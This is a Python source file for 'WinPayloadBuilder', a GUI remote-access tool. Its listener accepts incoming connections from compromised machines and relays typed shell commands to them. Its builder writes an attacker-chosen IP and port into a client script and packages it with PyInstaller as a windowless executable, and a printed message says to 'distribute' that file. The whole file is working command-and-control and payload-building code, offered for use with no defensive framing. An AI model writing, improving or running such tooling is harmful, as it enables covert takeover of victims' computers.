import socket
import subprocess
import threading
import tkinter as tk
from tkinter import simpledialog

def handle_client(connection, address):
    try:
        print(f"[+] GOT CONNECTION FROM {address}")

        while True:
            commands = input("Enter your cmd: ")
            commands = bytes(commands, 'utf-8')
            connection.send(commands)

            output = connection.recv(2048)

            if not output:
                print("Client disconnected.")
                break

            output = output.decode('utf-8')
            print(output)

    except socket.error as e:
        print(f"Socket error: {e}")
    except KeyboardInterrupt:
        print("\nCtrl+C detected. Closing the client connection.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        connection.close()

def start_listener(port):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        listener.bind(('0.0.0.0', port))
        listener.listen()
        print(f"Listener has started on port {port}")

        while True:
            connection, address = listener.accept()
            client_thread = threading.Thread(target=handle_client, args=(connection, address))
            client_thread.start()

    except socket.error as e:
        print(f"Socket error: {e}")
    except KeyboardInterrupt:
        print("\nCtrl+C detected. Closing the listener.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        listener.close()

def build_client_exe(ip, port):
    try:
        if not ip or not port:
            raise ValueError("IP and port are required.")

        def build_exe():
            with open("client_script.py", "r") as script_file:
                lines = script_file.readlines()

            for i, line in enumerate(lines):
                if "payload.connect" in line:
                    lines[i] = f'        payload.connect(("{ip}", {port}))\n'

            with open("client_script.py", "w") as script_file:
                script_file.writelines(lines)

            subprocess.run(["pyinstaller", "--onefile", "--noconsole", "client_script.py", "--distpath", "client_exe_dist", "--name", "client_exe"])
            print("Client executable built successfully.")
            print("Now you can distribute the 'client_exe.exe' file in the 'client_exe_dist' directory.")

        # Run the build_exe function in a separate thread
        threading.Thread(target=build_exe).start()

    except Exception as e:
        print(f"Error during executable build: {e}")

def start_listener_in_thread():
    try:
        listener_port = int(simpledialog.askstring("Listener Port", "Enter the port for the listener:"))
        if not listener_port:
            raise ValueError("Port is required.")
            
        listener_thread = threading.Thread(target=start_listener, args=(listener_port,))
        listener_thread.start()

    except Exception as e:
        print(f"Error: {e}")

# GUI setup
root = tk.Tk()
root.title("WinPayloadBuilder")
root.geometry("400x300")  # Set fixed dimensions
root.resizable(False, False)  # Fix the size

# Heading
heading_label = tk.Label(root, text="WinPayloadBuilder", font=("Helvetica", 20, "bold"), pady=5)
created_by_label = tk.Label(root, text="Created by InfoSecXplorer", font=("Helvetica", 12, "italic"))

# Grid placement for heading label
heading_label.grid(row=0, column=0, columnspan=2)
created_by_label.grid(row=1, column=0, columnspan=2)

# IP and Port input fields
ip_label = tk.Label(root, text="IP:")
ip_label.grid(row=2, column=0, padx=5, pady=5, sticky="e")
ip_entry = tk.Entry(root)
ip_entry.grid(row=2, column=1, padx=5, pady=5, sticky="w")

port_label = tk.Label(root, text="Port:")
port_label.grid(row=3, column=0, padx=5, pady=5, sticky="e")
port_entry = tk.Entry(root)
port_entry.grid(row=3, column=1, padx=5, pady=5, sticky="w")

# Build Client Button
build_button = tk.Button(root, text="Build Client EXE", command=lambda: build_client_exe(ip_entry.get(), port_entry.get()))
build_button.grid(row=4, column=0, columnspan=2, pady=10)

# Start Listener Button
start_listener_button = tk.Button(root, text="Start Listener", command=start_listener_in_thread)
start_listener_button.grid(row=5, column=0, columnspan=2, pady=10)

# Center the widgets
for i in range(6):
    root.grid_rowconfigure(i, weight=1)

for j in range(2):
    root.grid_columnconfigure(j, weight=1)

root.mainloop()
